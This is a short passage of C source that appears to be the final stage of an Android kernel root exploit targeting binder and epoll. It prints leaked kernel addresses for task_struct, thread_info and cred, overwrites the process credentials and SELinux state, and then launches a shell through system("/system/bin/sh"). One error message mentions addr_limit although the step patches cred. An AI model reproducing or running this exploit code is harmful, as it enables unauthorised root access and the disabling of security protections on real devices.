		printf("    task_struct = 0x%lx\n", lkdat.task);
		printf("    thread_info = 0x%lx\n", lkdat.thread);
		printf("    cred        = 0x%lx\n", lkdat.cred);
		printf("    kaddr       = 0x%lx\n", lkdat.kaddr);
	}
	else{
		printf("[%d] Leak kernel data failed!\n", step++);
		goto err;
	}

	/* 2、修改cred和selinux */
	if(!patch_cred_selinux(binder_fd, epfd, lkdat.kaddr + dev_info->offset_selinux, lkdat.cred)){
		printf("[%d] Patch addr_limit failed!\n", step++);
		return -1;
	}
	printf("[%d] Patch cred and selinux OK!\n", step++);

err:
	close(binder_fd);
	close(epfd);

	system("/system/bin/sh");

	return 0;
}
